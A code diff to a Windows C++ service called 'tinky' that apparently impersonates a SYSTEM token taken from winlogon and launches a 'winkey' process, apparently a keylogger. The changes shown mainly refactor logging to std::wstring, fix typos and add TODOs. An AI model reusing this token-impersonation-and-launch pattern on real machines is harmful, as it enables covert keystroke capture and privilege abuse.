@@ -12,7 +12,10 @@
 #include <cwchar>
 #include <cstdio>
 #include <iostream>
+#include <fstream>
 #include <tlhelp32.h>
+#include <string>
+#include <filesystem>
 
 #define SVCNAME L"tinky"
 
@@ -29,7 +32,7 @@ VOID WINAPI SvcCtrlHandler(DWORD);
 VOID ReportSvcStatus(DWORD, DWORD, DWORD);
 VOID SvcInit(DWORD, LPWSTR *);
 void SvcReportEvent(const wchar_t *);
-void LogEvent(const wchar_t *);
+void LogEvent(const std::wstring &message);
 
 // TOKEN IMPERSONATION*************************
 
@@ -83,7 +86,7 @@ HANDLE GetSystemTokenFromWinlogon()
 
 bool ImpersonateSystem(HANDLE hDupToken)
 {
-    // Checcks if the impresonated token still exists
+    // Checks if the impresonated token still exists
     if (!hDupToken)
         return false;
 
@@ -102,20 +105,22 @@ void SvcReportEvent(const wchar_t *msg)
     wprintf(L"%s\n", msg);
 }
 
-void LogEvent(const wchar_t *msg)
+void LogEvent(const std::wstring &message)
 {
-    const wchar_t *logPath = L"C:\\Windows\\Temp\\winkey.log";
-    FILE *f = nullptr;
-    errno_t err = _wfopen_s(&f, logPath, L"a+");
-    if (err != 0 || f == nullptr)
+    std::wstring logPath = L"C:\\Windows\\Temp\\tinky.log";
+
+    std::wofstream file(logPath, std::ios::app);
+    if (!file)
     {
-        wchar_t buf[256];
-        swprintf_s(buf, L"Failed to open log file, errno=%d, GetLastError=%lu", err, GetLastError());
-        OutputDebugStringW(buf); // can see that with DebugView
+        std::wstring buf =
+            L"Failed to open log file: " + logPath +
+            L", GetLastError=" + std::to_wstring(GetLastError());
+
+        OutputDebugStringW(buf.c_str());
         return;
     }
-    fwprintf(f, L"%s\n", msg);
-    fclose(f);
+
+    file << message << L'\n';
 }
 
 //
@@ -142,7 +147,6 @@ VOID SvcInit(DWORD dwArgc, LPWSTR *lpszArgv)
     // signals this event when it receives the stop control code.
     // IT IS USED TO WAKE OR STOP OUR CODE (for WaitSingleObject)
 
-    LogEvent(L"SvcInit entered");
     (void)dwArgc;
     (void)lpszArgv;
 
@@ -208,14 +212,14 @@ VOID SvcInit(DWORD dwArgc, LPWSTR *lpszArgv)
     RevertToSelf();
     if (bResult == 0)
     {
-        wchar_t buf[256];
-        swprintf_s(buf, L"Failed to create, GetLastError=%lu", GetLastError());
-        LogEvent(buf);
+        LogEvent(L"Failed to create, GetLastError=" + std::to_wstring(GetLastError()));
+        // TODO: return ;
     }
     // Save the process handler to kill it when stopping
     hwinkey = pi.hProcess;
 
     int counter = 0;
+    // TODO: is this loop really usefull ?
     while (WaitForSingleObject(ghSvcStopEvent, 1000) == WAIT_TIMEOUT)
     {
         counter++;
@@ -239,10 +243,17 @@ VOID SvcInit(DWORD dwArgc, LPWSTR *lpszArgv)
         //     RevertToSelf();
         // }
     }
-    // TODO : kill winkey process
-    wchar_t buf[128];
-    swprintf_s(buf, L"Service stopped after %d seconds", counter);
-    LogEvent(buf);
+    // TODO: kill winkey process
+    // TODO: really need to kill winkey here ?
+    // if (hwinkey != nullptr)
+    // {
+    //     if (TerminateProcess(hwinkey, 0) == 0)
+    //         LogEvent(L"Error while terminating the process winkey!\nGetLastError=" + std::to_wstring(GetLastError()));
+    //     hwinkey = nullptr;
+    // }
+
+    // TODO: remove this logEvent ?
+    LogEvent(L"Service stopped after " + std::to_wstring(counter) + L" seconds");
     ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
     return;
 }
@@ -304,11 +315,11 @@ VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
     if (dwCtrl == SERVICE_CONTROL_STOP)
     {
         ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
-
+        // kill winkey.exe
         if (hwinkey != nullptr)
         {
             if (TerminateProcess(hwinkey, 0) == 0)
-                LogEvent(L"Error while terminating the process winkey!");
+                LogEvent(L"Error while terminating the process winkey!\nGetLastError=" + std::to_wstring(GetLastError()));
             hwinkey = nullptr;
         }
         // Signal the service to stop.
